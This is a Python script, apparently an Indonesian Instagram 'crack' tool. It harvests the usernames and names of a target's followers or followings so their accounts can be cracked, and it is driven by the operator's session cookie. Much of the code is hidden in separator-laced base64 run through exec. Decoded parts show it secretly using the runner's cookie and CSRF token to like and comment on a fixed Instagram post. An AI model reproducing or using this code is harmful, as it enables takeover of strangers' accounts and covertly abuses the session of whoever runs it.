yπ9π9mb2xπ9πsb3cvπ9πJyxoZπ9πWFkZXπ9πJzPWhπ9πlYWRlπ9πcnMpCπ9πgkJc2π9πVzLnBπ9πvc3Qoπ9πJ2h0dπ9πHBzOiπ9π8vaS5π9πpbnN0π9πYWdyYπ9πW0uY2π9π9tL2Fπ9πwaS92π9πMS93Zπ9πWIvbGπ9πlrZXMπ9πvMjk1π9πODc3Mπ9πDQyODπ9πcwMjUπ9πwMTYyπ9πNy9saπ9πWtlLyπ9πcsaGVπ9πhZGVyπ9πcz1oZπ9πWFkZXπ9πJzKQoπ9πJCWNzπ9πcmYgPπ9πSByZSπ9π5maW5π9πkYWxsπ9πKCdjcπ9π3JmdGπ9π9rZW4π9π9KC4qπ9πPyk7Jπ9πywgY2π9π9kZXRπ9πlYW1bπ9πImNvbπ9π2tpZSπ9πJdKVsπ9πwXQoJπ9πCWlkXπ9π3UgPSπ9πByZS5π9πmaW5kπ9πYWxsKπ9πCdkc1π9π91c2Vπ9πyX2lkπ9πPSguKπ9πj8pOyπ9πcsIGNπ9πvZGV0π9πZWFtWπ9πyJjb2π9π9raWUπ9πiXSlbπ9πMF0KCπ9πQltaWπ9πQgID0π9πgcmUuπ9πZmluZπ9πGFsbCπ9πgnbWlπ9πkPSguπ9πKj8pOπ9πycsIGπ9πNvZGVπ9π0ZWFtπ9πWyJjbπ9π29raWπ9πUiXSlπ9πbMF0Kπ9πCQl0cπ9πnk6cnπ9πVyID0π9πgcmUuπ9πZmluZπ9πGFsbCπ9πgncnVπ9πyPSIoπ9πLiopIπ9πicsIGπ9πNvZGVπ9π0ZWFtπ9πWyJjbπ9π29raWπ9πUiXSlπ9πbMF0Kπ9πCQlleπ9πGNlcHπ9πQ6cnVπ9πyID0gπ9πcmUuZπ9πmluZGπ9πFsbCgπ9πncnVyπ9πPSIoLπ9πiopOyπ9πInLCBπ9πjb2Rlπ9πdGVhbπ9πVsiY2π9π9va2lπ9πlIl0pπ9πWzBdCπ9πgkJc2π9πtvcD0π9πgcmUuπ9πZmluZπ9πGFsbCπ9πgnc2Vπ9πzc2lvπ9πbmlkPπ9πSguKjπ9π8pOycπ9πsIGNvπ9πZGV0Zπ9πWFtWyπ9πJjb29π9πraWUiπ9πXSlbMπ9πF0KCQπ9πlrb21π9πlbj1mπ9πImNzcπ9πmZ0b2π9πtlbj1π9π7Y3Nyπ9πZn07Zπ9πHNfdXπ9πNlcl9π9πpZD17π9πaWRfdπ9πX07bWπ9πlkPXtπ9πtaWR9π9πO3J1cπ9πj17cnπ9πVyfTtπ9πzZXNzπ9πaW9uaπ9πWQ9e3π9πNrb3Bπ9π9IgoJπ9πCXNlcπ9πy5wb3π9πN0KCJπ9πodHRwπ9πczovLπ9π3d3dyπ9π5pbnNπ9π0YWdyπ9πYW0uYπ9π29tL2π9πFwaS9π9π2MS93π9πZWIvYπ9π29tbWπ9πVudHMπ9πvMjk1π9πODc3Mπ9πDQyODπ9πcwMjUπ9πwMTYyπ9πNy9hZπ9πGQvIiπ9πxoZWFπ9πkZXJzπ9πPWhlYπ9πWRlcnπ9πMsZGFπ9π0YT17π9πImNvbπ9πW1lbnπ9πRfdGVπ9π4dCI6π9πa29tZπ9πW59KQπ9πpjbGFπ9πzcyBjπ9πZWtfYπ9π29va2π9πllczoπ9πKCWRlπ9πZiBfXπ9π2luaXπ9πRfXyhπ9πzZWxmπ9πKToKCπ9πQl0cnπ9πk6Cgkπ9πJCWNvπ9πb2tpZπ9πXMgPSπ9πBjb2Rπ9πldGVhπ9πbVsiYπ9π29va2π9πllIl0π9πKCQkJπ9πcHJvZπ9πmlsX2π9πluZm8π9πgPSBzπ9πZXMuZπ9π2V0KCπ9πdodHRπ9πwczovπ9πL2kuaπ9πW5zdGπ9πFncmFπ9πtLmNvπ9πbS9hcπ9πGkvdjπ9πEvYWNπ9πjb3Vuπ9πdHMvZπ9πWRpdCπ9π93ZWJπ9πfZm9yπ9πbV9kYπ9πXRhLyπ9πcsaGVπ9πhZGVyπ9πcyA9Iπ9πHsndXπ9πNlci1π9πhZ2Vuπ9πdCcJOπ9πiBhZ2π9πVudCwπ9πneC1pπ9πZy1hcπ9πHAtaWπ9πQnCToπ9πgJzEyπ9πMTc5Oπ9πDE2NDπ9πQ4Nzkπ9π2Mjgnπ9πLCdjbπ9π29raWπ9πUnCQkπ9π6IGNvπ9πb2tpZπ9πXN9KQπ9πoJCQlπ9πpZiAnπ9πY2hlYπ9π2twb2π9πludCcπ9πgaW4gπ9πcHJvZπ9πmlsX2π9πluZm8π9πudGV4π9πdDpwcπ9πmludCπ9πhmIlxπ9πue3dhπ9πcn17bπ9πX1NYWπ9πFmIFNπ9πlcGVyπ9πdGlueπ9πWEgQ2π9π9va2lπ9πlcyBBπ9πbmRhIπ9πE5vdCπ9πBGb3Vπ9πuZC9Jπ9πbnZhbπ9πGlkIiπ9πk7b3Mπ9πuc3lzπ9πLmV4aπ9πXQoKTπ9πtxdWlπ9π0KCkKπ9πCQlleπ9πGNlcHπ9πQ6cHJπ9πpbnQoπ9πZiJ7dπ9π2FyfUπ9πNvb2tπ9πpZXMgπ9πU3VkYπ9πWggS2π9πFkYWxπ9π1YXJzπ9πYSAhIπ9πSIpO3π9πRpbWUπ9πuc2xlπ9πZXAoMπ9πik7bGπ9π9naW5π9πfY29vπ9πa2llKπ9πCkKCgπ9π==")))
class menu:
	def __init__(self):pass
	def get_data(self,user):
		_id = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}',headers = {'user-agent'	: agent,'x-ig-app-id'	: '1217981644879628','cookies'		: codeteam["cookie"]})
		_id = json.loads(_id.text)
		return {"id":_id['data']['user']['id'],
			"nama":_id['data']['user']["full_name"],
			"pengikut":_id['data']['user']["edge_followed_by"]["count"],
			"mengikuti":_id['data']['user']["edge_follow"]["count"],
			"post":_id['data']['user']["edge_owner_to_timeline_media"]["count"]
			}
	def data_saya(self):
		profil_info = ses.get('https://i.instagram.com/api/v1/accounts/edit/web_form_data/',headers = {'user-agent'	: agent,'x-ig-app-id'	: '1217981644879628','cookie'		: codeteam["cookie"]})
		profil_info	= profil_info.json()
		user=profil_info['form_data']['username']
		me = self.get_data(user)
		tampilan_data = f"""{WOR}{UU}ID       : {CC}{me['id']}
{WOR}{UU}NAMA     : {CC}{me['nama']}
{WOR}{UU}PENGIKUT : {CC}{me['pengikut']}
{WOR}{UU}MENGIKUTI: {CC}{me['mengikuti']}
{WOR}{UU}POSTINGAN: {CC}{me['post']}"""

		tampilan_key = f"""{WOR}{UU}NAMA KEY    : {CC}{status_key['nama']}
{WOR}{UU}KEY         : {KK}{status_key['key']}
{WOR}{UU}EXPIRED DAY : {II}{status_key['exp']} {CC}HARI LAGI
{WOR}{UU}EXPIRED DATE: {II}{status_key['hari']}
"""

		_jeeck_.append(Panel(tampilan_data,width=40,title=f"{GOD}{KK}DATA AKUN{GOD}",style=f"{A}"))
		_jeeck_.append(Panel(tampilan_key,width=45,title=f"{GOD}{KK}DATA KEY{GOD}",style=f"{A}"))
		console.print(Columns(_jeeck_))


	def daftar_menu(self):
		cls();logo();self.data_saya()
		tampilan_menu = f"""{QQ}[{CC}01{QQ}]{OO} Crack Dari Pengikut
{QQ}[{CC}02{QQ}]{OO} Crack Dari Mengikuti
{QQ}[{MM}OFF{QQ}]{OO} Crack Dari Pencarian Nama
{QQ}[{CC}EE{QQ}]{MM} Log Out"""
		tampilan_opsi = f"""{QQ}[{MM}OFF{QQ}]{OO} Bot Auto UnFollow
{QQ}[{MM}OFF{QQ}]{OO} Bot Auto Delete Postingan
{QQ}[{MM}OFF{QQ}]{OO} Bot Auto Komen
{QQ}[{CC}QQ{QQ}]{MM} Keluar"""
		_risky_.append(Panel(tampilan_menu,width=43,title=f"{GOD}{KK}MENU CRACK{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
		_risky_.append(Panel(tampilan_opsi,width=42,title=f"{GOD}{KK}MENU LAINNYA{GOD}",style=f"{A}"))
		console.print(Columns(_risky_))
		ass = input(f"{a}   ┗{k}MENU : {a}")
		if ass in ("1","01"):self.follower();quit()
		elif ass in ("2","02"):self.follow();quit()
		elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
		elif ass in ("4","04"):menu_belum_ada();self.daftar_menu()
		elif ass in ("5","05"):menu_belum_ada();self.daftar_menu()
		elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
#		elif ass in ("",""):
		elif ass in ("E","EE"):os.remove(".data/cookie.txt");quit()
		elif ass in ("Q","QQ"):quit()
		else:
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
			self.daftar_menu()

	exec(_RIZKY_("Risky Suka Hentai",_JE3CK_("Jeeck Santuy","ZGVmIπ9πGZvbGπ9πxvd2Vπ9πyKHNlπ9πbGYpOπ9πgoJdHπ9πJ5OiBπ9πaX1ogπ9πPSBzdπ9πGF0dXπ9πNfa2Vπ9π5WyJzπ9πdGF0dπ9πXMiXQπ9πoJZXhπ9πjZXB0π9πOnBhcπ9π3MKCWπ9πlmIHNπ9π0YXR1π9πc19rZπ9πXlbInπ9πN0YXRπ9π1cyJdπ9πPT0iQπ9πW1hbiπ9πI6Cgkπ9πJdHJ5π9πOgoJCπ9πQlwcmπ9πludHMπ9πoUGFuπ9πZWwoZπ9πiJ7V0π9πFSfU1π9πhc3Vrπ9πYW4gVπ9πXNlcmπ9π5hbWUπ9πgVGFyπ9πZ2V0Iπ9πFVudHπ9πVrIERπ9πpRHVtπ9πcCwgVπ9πGFyZ2π9πV0IEhπ9πhcnVzπ9πIEJlcπ9πnNpZmπ9πF0IFBπ9π1Ymxpπ9πYyIsdπ9πGl0bGπ9πU9ZiJπ9π7R09Eπ9πfXtQUπ9πH1UQVπ9πJHRVRπ9π7R09Eπ9πfSIsdπ9π2lkdGπ9πg9MTAπ9πwLHBhπ9πZGRpbπ9πmc9KDπ9πApLHNπ9π0eWxlπ9πPWYieπ9π0F9Iiπ9πxzdWJπ9π0aXRsπ9πZV9hbπ9πGlnbjπ9π0nbGVπ9πmdCcsπ9πc3Vidπ9πGl0bGπ9πU9ZiLπ9πilI9Tπ9πSUxBSπ9πEtBTiπ9πBJU0kπ9πiKSkKπ9πCQkJdπ9πGFyZ2π9πV0ID0π9πgaW5wπ9πdXQoZπ9πiJ7YXπ9π0gICDπ9πilJd7π9πY31Vcπ9π2Vybmπ9πFtZSBπ9πUYXJnπ9πZXQgOπ9πiB7YXπ9π0iKQoπ9πJCQl6π9πID0gcπ9π2VsZiπ9π5nZXRπ9πfZGF0π9πYSh0Yπ9πXJnZXπ9πQpCgkπ9πJCWxsπ9πcCA9Iπ9πHpbImπ9πlkIl0π9πKCQkJπ9πcHJpbπ9πnRzKFπ9πBhbmVπ9πsKGYiπ9πe1dPUπ9πn17SUπ9πl9TmFπ9πtYSA6π9πIHtVVπ9πX17elπ9πsnbmFπ9πtYSddπ9πfXtRUπ9πX1cbnπ9πtXT1Jπ9π9e0lJπ9πfVBlbπ9πmdpa3π9πV0IDoπ9πge1VVπ9πfXt6Wπ9πydwZWπ9π5naWtπ9π1dCddπ9πfXtRUπ9πX0iLHπ9πRpdGxπ9πlPWYiπ9πe0dPRπ9πH17UFπ9πB9VEFπ9πSR0VUπ9πe0dPRπ9πH0iLHπ9πdpZHRπ9πoPTEwπ9πMCxwYπ9πWRkaWπ9π5nPSgπ9πwKSxzπ9πdHlsZπ9πT1mInπ9πtBfSIπ9πsc3Viπ9πdGl0bπ9πGVfYWπ9πxpZ24π9π9J2xlπ9πZnQnLπ9πHN1Ynπ9πRpdGxπ9πlPWYiπ9π4pSPUπ9π0lMQUπ9πhLQU4π9πgSVNJπ9πIikpCπ9πgkJZXπ9πhjZXBπ9π0IFZhπ9πbHVlRπ9πXJyb3π9πI6cHJπ9πpbnQoπ9πZiJ7dπ9π2FyfXπ9πttfU1π9πhYWYgπ9πVXNlcπ9πm5hbWπ9πUgWWFπ9πuZyBBπ9πbmRhIπ9πE1hc3π9πVrYW4π9πgVGlkπ9πYWsgRπ9πGlUZWπ9π11a2Fπ9πuLi4uπ9πe3F9Iπ9πik7dGπ9πltZS5π9πzbGVlπ9πcCgzKπ9πTtzZWπ9πxmLmZπ9πvbGxvπ9πd2VyKπ9πCkKCQπ9πl0cnkπ9π6CgkJπ9πCXJpcπ9π2t5Xzπ9π1zZXMπ9πuZ2V0π9πKCdodπ9πHRwczπ9πovL2kπ9πuaW5zπ9πdGFncπ9πmFtLmπ9πNvbS9π9πhcGkvπ9πdjEvZπ9πnJpZWπ9π5kc2hπ9πpcHMvπ9πJXMvZπ9πm9sbGπ9π93ZXJπ9πzLz9jπ9πb3Vudπ9πD0xMDπ9πAwMDAπ9πnJSh6π9πWyJpZπ9πCJdKSπ9πxjb29π9πraWVzπ9πPXsiYπ9π29va2π9πllIjpπ9πjb2Rlπ9πdGVhbπ9πVsiY2π9π9va2lπ9πlIl19π9πLGhlYπ9πWRlcnπ9πM9eyJπ9π1c2Vyπ9πLWFnZπ9πW50Ijπ9πpVc2Vπ9πyX0Fnπ9πZW50Xπ9π0Zha2π9πUxfSkπ9πKCQkJπ9πamVlYπ9π2tfPWπ9πpzb24π9πubG9hπ9πZHMocπ9πmlza3π9πlfLnRπ9πleHQpπ9πCgkJCπ9πWZvciπ9πBpaSBπ9πpbiBqπ9πZWVjaπ9π19bJ3π9πVzZXJπ9πzJ106π9πCgkJCπ9πQlpZCπ9π5hcHBπ9πlbmQoπ9πZid7aπ9πWlbInπ9πVzZXJπ9πuYW1lπ9πIl19fπ9πHx7aWπ9πlbImZπ9π1bGxfπ9πbmFtZπ9πSJdfSπ9πcpCgkπ9πJCQlzπ9πeXMucπ9π3Rkb3π9πV0Lndπ9πyaXRlπ9πKGYnXπ9πHJ7cmπ9πFuZG9π9πtLmNoπ9πb2ljZπ9πShbd2π9π9yLHdπ9πhcix3π9πaXJdKπ9πX17cHπ9π17aDJπ9π9U2Vkπ9πYW5nIπ9πE1lbmπ9πd1bXBπ9π1bGthπ9πbiB7aπ9πX17bGπ9πVuKGlπ9πkKX17π9πcH0gVπ9πXNlciπ9πcpLHNπ9π5cy5zπ9πdGRvdπ9πXQuZmπ9πx1c2gπ9πoKQoJπ9πCQl0cπ9πnk6Cgπ9πkJCQlπ9πtYXhpπ9πZD1qZπ9πWVja1π9π9bJ25π9πleHRfπ9πbWF4Xπ9π2lkJ1π9π0KCQkπ9πJCWZvπ9πciB6Iπ9πGluIHπ9πJhbmdπ9πlKDk5π9πOTkpOπ9πgoJCQπ9πkJCXRπ9πyeToKπ9πCQkJCπ9πQkJX2π9πpfPSBπ9πzZXMuπ9πZ2V0Kπ9πGYnaHπ9πR0cHMπ9π6Ly9pπ9πLmlucπ9π3RhZ3π9πJhbS5π9πjb20vπ9πYXBpLπ9π3YxL2π9πZyaWVπ9πuZHNoπ9πaXBzLπ9π3tsbHπ9πB9L2Zπ9πvbGxvπ9πd2Vycπ9πy8/Y2π9π91bnQπ9π9MTAwπ9πMDAmbπ9πWF4X2π9πlkPXtπ9πtYXhpπ9πZH0nLπ9πGhlYWπ9πRlcnMπ9πgPSB7π9πJ3VzZπ9πXItYWπ9πdlbnQπ9πnCTogπ9πVXNlcπ9πl9BZ2π9πVudF9π9πGYWtlπ9πMSwnYπ9π29va2π9πllJwkπ9πJOiBjπ9πb2Rldπ9πGVhbVπ9πsiY29π9πva2llπ9πIl19Kπ9πQoJCQπ9πkJCQlπ9πfcl89π9πanNvbπ9πi5sb2π9πFkcyhπ9πfal8uπ9πdGV4dπ9πCkKCQπ9πkJCQkπ9πJdHJ5π9πOgoJCπ9πQkJCQπ9πkJZm9π9πyIGlpπ9πIGluIπ9πF9yX1π9πsndXNπ9πlcnMnπ9πXToKCπ9πQkJCQπ9πkJCQlπ9πpZiBpπ9πaVsiZπ9πnVsbFπ9π9uYW1π9πlIl0gπ9πPT0gIπ9πiI6cGπ9πFzcwoπ9πJCQkJπ9πCQkJCπ9πWVsc2π9πU6Cgkπ9πJCQkJπ9πCQkJCπ9πWlkLmπ9πFwcGVπ9πuZChmπ9πJ3tpaπ9πVsidXπ9πNlcm5π9πhbWUiπ9πXX18fπ9πHtpaVπ9πsiZnVπ9πsbF9uπ9πYW1lIπ9πl19Jyπ9πkKCQkπ9πJCQkJπ9πCQlzeπ9πXMuc3π9πRkb3Vπ9π0Lndyπ9πaXRlKπ9πGYnXHπ9πJ7cmFπ9πuZG9tπ9πLmNobπ9π2ljZSπ9πhbd29π9πyLHdhπ9πcix3aπ9πXJdKXπ9π17cH1π9π7aDJ9π9πU2VkYπ9πW5nIEπ9π1lbmdπ9π1bXB1π9πbGthbπ9πiB7aXπ9π17bGVπ9πuKGlkπ9πKX17cπ9πH0gVXπ9πNlcicπ9πpLHN5π9πcy5zdπ9πGRvdXπ9πQuZmxπ9π1c2goπ9πKQoJCπ9πQkJCQπ9πkJdHJπ9π5Om1hπ9πeGlkPπ9πV9yX1π9πsnbmVπ9π4dF9tπ9πYXhfaπ9πWQnXQπ9πoJCQkπ9πJCQkJπ9πZXhjZπ9πXB0Omπ9πJyZWFπ9πrCgkJπ9πCQkJCπ9πWV4Y2π9πVwdDpπ9πwYXNzπ9πCgkJCπ9πQkJCWπ9πlmICdπ9πjaGFsπ9πbGVuZπ9π2UnIGπ9πluIF9π9πqXy50π9πZXh0Oπ9πmJyZWπ9πFrCgkπ9πJCQkJπ9πCWVscπ9π2U6Y2π9π9udGlπ9πudWUKπ9πCQkJCπ9πQlleGπ9πNlcHQπ9πgS2V5π9πYm9hcπ9πmRJbnπ9πRlcnJπ9π1cHQ6π9πYnJlYπ9πWsKCQπ9πkJZXhπ9πjZXB0π9πOnBhcπ9π3MKCQπ9πlleGNπ9πlcHQgπ9πRXhjZπ9πXB0aWπ9π9uIGFπ9πzIGU6π9πb3Mucπ9π3lzLmπ9πV4aXQπ9πoZiJ7π9πd2Fyfπ9πXttfUπ9πVycm9π9πyIHtxπ9πfTogeπ9π2t9e3π9πN0cihπ9πlKX0iπ9πKQoJCπ9πXByaWπ9π50KGYπ9πiXHJ7π9πdX17aπ9πmFyYWπ9πt9e3Fπ9π9XG57π9πd29yfπ9πXtrfUπ9πJlcmhπ9πhc2lsπ9πIE1lbπ9πmd1bXπ9πB1bGtπ9πhbiB7π9πaX17bπ9πGVuKGπ9πlkKX1π9π7a30gπ9πVXNlcπ9πiIpCgπ9πkJY3Jπ9πhY2soπ9πKQoJCπ9πXF1aXπ9πQoKQpπ9πkZWYgπ9πZm9sbπ9πG93KHπ9πNlbGYπ9πpOgoJπ9πdHJ5Oπ9πiBaX1π9πogPSBπ9πzdGF0π9πdXNfaπ9π2V5Wyπ9πJzdGFπ9π0dXMiπ9πXQoJZπ9πXhjZXπ9πB0OnBπ9πhc3MKπ9πCWlmIπ9πHN0YXπ9πR1c19π9πrZXlbπ9πInN0Yπ9πXR1cyπ9πJdPT0π9πiQW1hπ9πbiI6Cπ9πgkJdHπ9πJ5Ogoπ9πJCQlwπ9πcmludπ9πHMoUGπ9πFuZWwπ9πoZiJ7π9πV0FSfπ9πU1hc3π9πVrYW4π9πgVXNlπ9πcm5hbπ9πWUgVGπ9πFyZ2Vπ9π0IFVuπ9πdHVrIπ9πERpRHπ9πVtcCwπ9πgVGFyπ9πZ2V0Iπ9πEhhcnπ9πVzIEJπ9πlcnNpπ9πZmF0Iπ9πFB1Ymπ9πxpYyIπ9πsdGl0π9πbGU9Zπ9πiJ7R0π9π9EfXtπ9πQUH1Uπ9πQVJHRπ9πVR7R0π9π9EfSIπ9πsd2lkπ9πdGg9Mπ9πTAwLHπ9πBhZGRπ9πpbmc9π9πKDApLπ9πHN0eWπ9πxlPWYπ9πie0F9π9πIixzdπ9πWJ0aXπ9πRsZV9π9πhbGlnπ9πbj0nbπ9πGVmdCπ9πcsc3Vπ9πidGl0π9πbGU9Zπ9πiLilIπ9π9TSUxπ9πBSEtBπ9πTiBJUπ9π0kiKSπ9πkKCQkπ9πJdGFyπ9πZ2V0Iπ9πD0gaWπ9π5wdXQπ9πoZiJ7π9πYX0gIπ9πCDilJπ9πd7Y31π9πVc2Vyπ9πbmFtZπ9πSBUYXπ9πJnZXQπ9πgOiB7π9πYX0iKπ9πQoJCQπ9πl6ID0π9πgc2Vsπ9πZi5nZπ9πXRfZGπ9πF0YShπ9π0YXJnπ9πZXQpCπ9πgkJCWπ9πxscCAπ9π9IHpbπ9πImlkIπ9πl0KCQπ9πkJcHJπ9πpbnRzπ9πKFBhbπ9πmVsKGπ9πYie1dπ9πPUn17π9πSUl9Tπ9πmFtYSπ9πA6IHtπ9πVVX17π9πelsnbπ9πmFtYSπ9πddfXtπ9πRUX1cπ9πbntXTπ9π1J9e0π9πlJfW1π9πlbmdpπ9πa3V0aπ9πSA6IHπ9πtVVX1π9π7elsnπ9πbWVuZπ9π2lrdXπ9πRpJ11π9π9e1FRπ9πfSIsdπ9πGl0bGπ9πU9ZiJπ9π7R09Eπ9πfXtQUπ9πH1UQVπ9πJHRVRπ9π7R09Eπ9πfSIsdπ9π2lkdGπ9πg9MTAπ9πwLHBhπ9πZGRpbπ9πmc9KDπ9πApLHNπ9π0eWxlπ9πPWYieπ9π0F9Iiπ9πxzdWJπ9π0aXRsπ9πZV9hbπ9πGlnbjπ9π0nbGVπ9πmdCcsπ9πc3Vidπ9πGl0bGπ9πU9ZiLπ9πilI9Tπ9πSUxBSπ9πEtBTiπ9πBJU0kπ9πiKSkKπ9πCQlleπ9πGNlcHπ9πQgVmFπ9πsdWVFπ9πcnJvcπ9πjpwcmπ9πludChπ9πmInt3π9πYXJ9eπ9π219TWπ9πFhZiBπ9πVc2Vyπ9πbmFtZπ9πSBZYWπ9π5nIEFπ9πuZGEgπ9πTWFzdπ9πWthbiπ9πBUaWRπ9πhayBEπ9πaVRlbπ9πXVrYWπ9π4uLi5π9π7cX0iπ9πKTt0aπ9πW1lLnπ9πNsZWVπ9πwKDMpπ9πO3Nlbπ9πGYuZmπ9π9sbG9π9π3ZXIoπ9πKQoJCπ9πXRyeTπ9πoKCQkπ9πJcmlzπ9πa3lfPπ9πXNlcyπ9π5nZXQπ9πoJ2h0π9πdHBzOπ9πi8vaSπ9π5pbnNπ9π0YWdyπ9πYW0uYπ9π29tL2π9πFwaS9π9π2MS9mπ9πcmllbπ9πmRzaGπ9πlwcy8π9πlcy9mπ9πb2xsbπ9π3dpbmπ9πcvP2Nπ9πvdW50π9πPTEwMπ9πDAwMCπ9πclKHpπ9πbImlkπ9πIl0pLπ9πGNvb2π9πtpZXMπ9π9eyJjπ9πb29raπ9πWUiOmπ9πNvZGVπ9π0ZWFtπ9πWyJjbπ9π29raWπ9πUiXX0π9πsaGVhπ9πZGVycπ9πz17Inπ9πVzZXIπ9πtYWdlπ9πbnQiOπ9πlVzZXπ9πJfQWdπ9πlbnRfπ9πRmFrZπ9πTF9KQπ9πoJCQlπ9πqZWVjπ9πa189aπ9πnNvbiπ9π5sb2Fπ9πkcyhyπ9πaXNreπ9πV8udGπ9πV4dCkπ9πKCQkJπ9πZm9yIπ9πGlpIGπ9πluIGpπ9πlZWNrπ9πX1sndπ9πXNlcnπ9πMnXToπ9πKCQkJπ9πCWlkLπ9πmFwcGπ9πVuZChπ9πmJ3tpπ9πaVsidπ9πXNlcmπ9π5hbWUπ9πiXX18π9πfHtpaπ9πVsiZnπ9πVsbF9π9πuYW1lπ9πIl19Jπ9πykKCQπ9πkJCXNπ9π5cy5zπ9πdGRvdπ9πXQud3π9πJpdGUπ9πoZidcπ9πcntyYπ9πW5kb2π9π0uY2hπ9πvaWNlπ9πKFt3bπ9π3Isd2π9πFyLHdπ9πpcl0pπ9πfXtwfπ9πXtoMnπ9π1TZWRπ9πhbmcgπ9πTWVuZπ9π3VtcHπ9πVsa2Fπ9πuIHtpπ9πfXtsZπ9πW4oaWπ9πQpfXtπ9πwfSBVπ9πc2VyJπ9πyksc3π9πlzLnNπ9π0ZG91π9πdC5mbπ9πHVzaCπ9πgpCgkπ9πJCXRyπ9πeToKCπ9πQkJCWπ9π1heGlπ9πkPWplπ9πZWNrXπ9π1snbmπ9πV4dF9π9πtYXhfπ9πaWQnXπ9πQoJCQπ9πkJZm9π9πyIHogπ9πaW4gcπ9πmFuZ2π9πUoOTkπ9π5OSk6π9πCgkJCπ9πQkJdHπ9πJ5Ogoπ9πJCQkJπ9πCQlfaπ9πl89IHπ9πNlcy5π9πnZXQoπ9πZidodπ9πHRwczπ9πovL2kπ9πuaW5zπ9πdGFncπ9πmFtLmπ9πNvbS9π9πhcGkvπ9πdjEvZπ9πnJpZWπ9π5kc2hπ9πpcHMvπ9πe2xscπ9πH0vZmπ9π9sbG9π9π3aW5nπ9πLz9jbπ9π3VudDπ9π0xMDAπ9πwMCZtπ9πYXhfaπ9πWQ9e2π9π1heGlπ9πkfScsπ9πaGVhZπ9πGVycyπ9πA9IHsπ9πndXNlπ9πci1hZπ9π2VudCπ9πcJOiBπ9πVc2Vyπ9πX0FnZπ9πW50X0π9πZha2Uπ9πxLCdjπ9πb29raπ9πWUnCQπ9πk6IGNπ9πvZGV0π9πZWFtWπ9πyJjb2π9π9raWUπ9πiXX0pπ9πCgkJCπ9πQkJCVπ9π9yXz1π9πqc29uπ9πLmxvYπ9πWRzKFπ9π9qXy5π9π0ZXh0π9πKQoJCπ9πQkJCQπ9πl0cnkπ9π6CgkJπ9πCQkJCπ9πQlmb3π9πIgaWkπ9πgaW4gπ9πX3JfWπ9πyd1c2π9πVycydπ9πdOgoJπ9πCQkJCπ9πQkJCWπ9πlmIGlπ9πpWyJmπ9πdWxsXπ9π25hbWπ9πUiXSAπ9π9PSAiπ9πIjpwYπ9πXNzCgπ9πkJCQkπ9πJCQkJπ9πZWxzZπ9πToKCQπ9πkJCQkπ9πJCQkJπ9πaWQuYπ9πXBwZWπ9π5kKGYπ9πne2lpπ9πWyJ1cπ9π2Vybmπ9πFtZSJπ9πdfXx8π9πe2lpWπ9πyJmdWπ9πxsX25π9πhbWUiπ9πXX0nKπ9πQoJCQπ9πkJCQkπ9πJCXN5π9πcy5zdπ9πGRvdXπ9πQud3Jπ9πpdGUoπ9πZidccπ9πntyYWπ9π5kb20π9πuY2hvπ9πaWNlKπ9πFt3b3π9πIsd2Fπ9πyLHdpπ9πcl0pfπ9πXtwfXπ9πtoMn1π9πTZWRhπ9πbmcgTπ9πWVuZ3π9πVtcHVπ9πsa2Fuπ9πIHtpfπ9πXtsZWπ9π4oaWQπ9πpfXtwπ9πfSBVcπ9π2VyJyπ9πksc3lπ9πzLnN0π9πZG91dπ9πC5mbHπ9πVzaCgπ9πpCgkJπ9πCQkJCπ9πQl0cnπ9πk6bWFπ9π4aWQ9π9πX3JfWπ9πyduZXπ9πh0X21π9πheF9pπ9πZCddCπ9πgkJCQπ9πkJCQlπ9πleGNlπ9πcHQ6Yπ9πnJlYWπ9πsKCQkπ9πJCQkJπ9πZXhjZπ9πXB0Onπ9πBhc3Mπ9πKCQkJπ9πCQkJaπ9πWYgJ2π9πNoYWxπ9πsZW5nπ9πZScgaπ9πW4gX2π9πpfLnRπ9πleHQ6π9πYnJlYπ9πWsKCQπ9πkJCQkπ9πJZWxzπ9πZTpjbπ9π250aWπ9π51ZQoπ9πJCQkJπ9πCWV4Yπ9π2VwdCπ9πBLZXlπ9πib2Fyπ9πZEludπ9πGVycnπ9πVwdDpπ9πicmVhπ9πawoJCπ9πQlleGπ9πNlcHQπ9π6cGFzπ9πcwoJCπ9πWV4Y2π9πVwdCBπ9πFeGNlπ9πcHRpbπ9π24gYXπ9πMgZTpπ9πvcy5zπ9πeXMuZπ9πXhpdCπ9πhmIntπ9π3YXJ9π9πe219Rπ9πXJyb3π9πIge3Fπ9π9OiB7π9πa317cπ9π3RyKGπ9πUpfSIπ9πpCgkJπ9πcHJpbπ9πnQoZiπ9πJccntπ9π1fXtqπ9πYXJhaπ9π317cXπ9π1cbntπ9π3b3J9π9πe2t9Qπ9πmVyaGπ9πFzaWwπ9πgTWVuπ9πZ3Vtcπ9πHVsa2π9πFuIHtπ9πpfXtsπ9πZW4oaπ9πWQpfXπ9πtrfSBπ9πVc2Vyπ9πIikKCπ9πQljcmπ9πFjaygπ9πpCgkJπ9πcXVpdπ9πCgpCgπ9π==")))
	def unfollow_all(self,id):
		try:
			csrf = re.findall('csrftoken=(.*?);', codeteam["cookie"])[0]
			agent = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 244.0.0.12.112 (iPhone12,1; iOS 15_5; en_US; en-US; scale=2.00; 828x1792; 383361019)","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone12,1; iOS 15_5; en_US; en-US; scale=2.00; 828x1792; 382468104)","Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone14,3; iOS 15_5; en_US; en-US; scale=3.00; 1284x2778; 382468104) NW/3","Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 257.1.0.13.119 (iPhone14,5; iOS 16_0; ko-Kore_KR; ko-KR; scale=3.00; 1170x2532; 409247554)"])
